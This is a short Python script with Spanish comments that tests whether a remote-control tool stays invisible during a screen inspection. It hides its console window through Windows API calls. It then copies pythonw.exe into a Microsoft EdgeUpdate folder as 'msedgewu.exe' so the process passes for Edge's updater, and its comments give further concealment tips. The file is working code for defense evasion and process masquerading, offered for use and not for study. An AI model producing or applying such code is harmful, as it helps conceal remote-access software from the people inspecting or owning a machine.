"""test_stealth.py — verifica que el remoto no deje rastro visible en SS."""
import ctypes
import sys
import os
import ctypes.wintypes as wt

print("=== ANTES ===")
print("cmd visible:", bool(ctypes.windll.kernel32.GetConsoleWindow()))

# --- ocultar la consola ---
h = ctypes.windll.kernel32.GetConsoleWindow()
if h:
    ctypes.windll.user32.ShowWindow(h, 0)

# --- nombre del proceso: python.exe corriendo onix_remote.py delata ---
# la forma real: lanzar via pythonw (sin consola) y renombrar el exe
# o: empaquetar como exe con nombre inofensivo
print("cmd ocultado:", h != 0)

# --- el puerto: se abre solo cuando se usa, se cierra al PANIC ---
print("puerto: abierto solo mientras el panel esta activo; PANIC lo cierra")

# --- el nombre del proceso: en tasklist aparece 'python.exe' ---
# con pythonw.exe no hay consola; el nombre sigue siendo pythonw
# solucion completa: copiar pythonw.exe como algo inofensivo
src = sys.executable.replace("python.exe", "pythonw.exe")
dst = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "EdgeUpdate", "msedgewu.exe")
print("copia pythonw como:", dst)
try:
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    import shutil
    shutil.copy2(src, dst)
    print("copiado OK")
except Exception as e:
    print("copia ERR:", e)
